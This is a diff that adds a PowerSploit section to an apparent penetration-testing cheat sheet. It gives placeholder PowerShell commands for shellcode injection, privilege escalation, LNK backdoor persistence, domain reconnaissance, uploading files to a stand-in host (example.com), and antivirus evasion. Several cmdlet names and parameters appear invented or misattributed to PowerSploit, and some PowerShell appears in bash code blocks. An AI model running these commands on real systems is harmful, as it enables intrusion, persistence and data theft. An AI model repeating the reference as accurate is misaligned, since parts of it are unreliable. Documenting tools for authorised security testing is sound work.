@@ -691,6 +691,86 @@ Extracts credentials from requested certificates, including NTLM hashes and priv
   ```
 
 ### PowerSploit
+PowerSploit is a collection of PowerShell scripts designed for use by penetration testers and security professionals. It provides tools for exploiting, auditing, and post-exploitation tasks within Windows environments. PowerSploit leverages the power of PowerShell to perform a wide range of activities, from injecting code and escalating privileges to gathering information and maintaining persistence.
+
+- **Purpose**: To provide a suite of PowerShell scripts for penetration testing and post-exploitation tasks.
+
+#### Key Features
+
+1. **Code Execution**: Provides various methods for executing arbitrary code.
+2. **Privilege Escalation**: Scripts to escalate privileges on a compromised system.
+3. **Persistence**: Tools to establish and maintain persistence within a target environment.
+4. **Credential Harvesting**: Methods for extracting credentials from memory and other locations.
+5. **Reconnaissance**: Scripts for gathering detailed information about the target environment.
+6. **Antivirus Evasion**: Techniques for evading antivirus and endpoint protection mechanisms.
+7. **Exfiltration**: Tools for extracting and exfiltrating data from the target.
+
+#### Key Modules and Scripts
+
+##### CodeExecution
+
+- **Invoke-Shellcode**: Injects shellcode into the process.
+  ```powershell
+  Invoke-Shellcode -Shellcode @([Convert]::FromBase64String("<base64_shellcode>")) -Force
+  ```
+- **Invoke-ReflectivePEInjection**: Reflectively loads a PE (Portable Executable) into memory
+  ```powershell
+  Invoke-ReflectivePEInjection -PEPath "<path_to_pe_file>"
+  ```
+
+##### Privesc (Privilege Escalation)
+- **Invoke-MS16-032**: Exploits the MS16-032 vulnerability to escalate privileges.
+  ```powershell
+  Invoke-MS16-032
+  ```
+- **Get-System**: Attempts to obtain SYSTEM privileges using various techniques.
+  ```powershell
+  Get-System
+  ```
+
+##### Persistence
+- **Invoke-BackdoorLNK**: Creates a backdoored LNK file for persistence.
+  ```powershell
+  Invoke-BackdoorLNK -FilePath "C:\path\to\file.lnk" -Payload "<payload>"
+  ```
+- **New-UserPersistenceOption:** Adds a new user and configures persistence mechanisms.
+  ```powershell
+  New-UserPersistenceOption -UserName "<username>" -Password "<password>"
+  ```
+
+##### Recon (Reconnaissance)
+- **Get-NetUser**: Retrieves user accounts from the domain.
+  ```powershell
+  Get-NetUser -UserName "<username>"
+  ```
+- **Get-NetGroup**: Retrieves group memberships from the domain.
+  ```powershell
+  Get-NetGroup -GroupName "<groupname>"
+  ```
+- **Get-NetComputer**: Lists all computers in the domain.
+  ```powershell
+  Get-NetComputer
+  ```
+
+##### Exfiltration
+- **Invoke-FileUpload**: Uploads a file to a remote server.
+  ```bash
+    Invoke-FileUpload -FilePath "C:\path\to\file.txt" -Url "http://example.com/upload"
+  ```
+- **Invoke-FileDownload**: Downloads a file from a remote server.
+  ```bash
+  Invoke-FileDownload -Url "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
+  ```
+
+##### Antivirus Evasion
+- **Invoke-Obfuscation**: Obfuscates PowerShell scripts to evade detection.
+  ```bash
+  Invoke-Obfuscation
+  ```
+- **Out-EncryptedScript**: Encrypts a PowerShell script to evade antivirus.
+  ```bash
+  Out-EncryptedScript -ScriptPath "C:\path\to\script.ps1" -OutPath "C:\path\to\encrypted.ps1"
+  ```
 
 ### PowerUpSQL
 
